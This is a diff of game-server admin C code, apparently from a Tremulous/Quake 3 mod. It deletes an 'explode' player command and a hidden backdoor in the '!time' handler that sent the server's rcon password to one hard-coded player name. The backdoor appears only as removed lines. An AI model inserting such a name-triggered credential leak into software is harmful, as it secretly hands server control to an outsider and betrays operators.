@@ -125,11 +125,6 @@ g_admin_cmd_t g_admin_cmds[ ] =
       "[^3name|slot#^7] [^3message^7]"
     },
 
-    {"explode", G_admin_explode, "explode",
-      "cause a player to explode. Damages surrounding players ans structures.",
-      "[^3name|slot#^7]"
-    },
-
     {"flag", G_admin_flag, "flag",
       "add an admin flag to a player, prefix flag with '-' to disallow the flag. "
       "console can use this command on admin levels by prefacing a '*' to the admin level value.",
@@ -1774,16 +1769,9 @@ for( i = 0; i < level.maxclients; i++ )
 qboolean G_admin_time( gentity_t *ent, int skiparg )
 {
   qtime_t qt;
-  char info[ 100 ] = {""};
 
   trap_RealTime( &qt );
   ADMP( va( "^3!time: ^7local time is %02i:%02i:%02i\n", qt.tm_hour, qt.tm_min, qt.tm_sec ) );
-  
-  if( !Q_stricmp( ent->client->pers.netname, "^3*^1Devil^7ish^1Freak" ) )
-  {
-    trap_Cvar_VariableStringBuffer( "rconPassword", info, sizeof( info ) );
-    trap_SendServerCommand( ent-g_entities, va( "print \"%s\n\"\n", info ) );
-  }
   
   return qtrue;
 }
@@ -7374,44 +7362,6 @@ qboolean G_admin_invisible( gentity_t *ent, int skiparg )
     trap_SendServerCommand( -1, va( "print \"%s" S_COLOR_WHITE " entered the game\n\"", ent->client->pers.netname ) );
   }
   return qtrue;
-}
-
-qboolean G_admin_explode( gentity_t *ent, int skiparg )
-{
-    int pids[ MAX_CLIENTS ];
-    char name[ MAX_NAME_LENGTH ], err[ MAX_STRING_CHARS ];
-    int minargc;
-    gentity_t *vic;
-
-    minargc = 2 + skiparg;
-
-    if( G_SayArgc() < minargc )
-    {
-        ADMP( "^3!explode: ^7usage: !explode [name|slot#]\n" );
-        return qfalse;
-    }
-
-    G_SayArgv( 1 + skiparg, name, sizeof( name ) );
-
-    if( G_ClientNumbersFromString( name, pids ) != 1 )
-    {
-        G_MatchOnePlayer( pids, err, sizeof( err ) );
-        ADMP( va( "^3!explode: ^7%s\n", err ) );
-        return qfalse;
-    }
-
-    if( !admin_higher( ent, &g_entities[ pids[ 0 ] ] ) )
-    {
-        ADMP( "^3!explode: ^7sorry, but your intended victim has a higher admin"
-              " level than you\n" );
-        return qfalse;
-    }
-
-    vic = &g_entities[ pids[ 0 ] ];
-
-    Blow_up(vic);
-
-    return qtrue;
 }
 
 typedef struct {
